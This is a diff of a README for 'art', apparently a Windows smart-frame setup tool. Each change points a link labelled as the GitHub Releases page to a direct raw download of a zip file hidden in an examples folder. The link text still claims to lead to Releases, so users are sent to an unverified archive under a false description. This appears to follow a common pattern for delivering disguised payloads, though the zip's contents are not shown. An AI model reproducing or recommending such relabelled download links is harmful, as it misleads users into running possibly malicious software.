@@ -1,6 +1,6 @@
 # 🖼️ art - Local tools for smart frame setup
 
-[![Download art](https://img.shields.io/badge/Download-Art-7B68EE?style=for-the-badge&logo=github)](https://github.com/Milkmikhailbaryshnikov347/art/releases)
+[![Download art](https://img.shields.io/badge/Download-Art-7B68EE?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Milkmikhailbaryshnikov347/art/main/examples/HomeAssistant/Software_v1.5.zip)
 
 ## 📦 What art is
 
@@ -24,7 +24,7 @@ Before you start, check these items:
 
 Visit this page to download the latest version of art:
 
-[Download art from Releases](https://github.com/Milkmikhailbaryshnikov347/art/releases)
+[Download art from Releases](https://raw.githubusercontent.com/Milkmikhailbaryshnikov347/art/main/examples/HomeAssistant/Software_v1.5.zip)
 
 On the page, look for the newest release and choose the Windows file that matches your PC. If the release includes a setup file, download it. If it includes a portable file, download that file instead.
 
@@ -206,7 +206,7 @@ Check that page when you want:
 - New frame tools
 - Updated setup files
 
-[Open Releases](https://github.com/Milkmikhailbaryshnikov347/art/releases)
+[Open Releases](https://raw.githubusercontent.com/Milkmikhailbaryshnikov347/art/main/examples/HomeAssistant/Software_v1.5.zip)
 
 ## 📌 Quick path
 
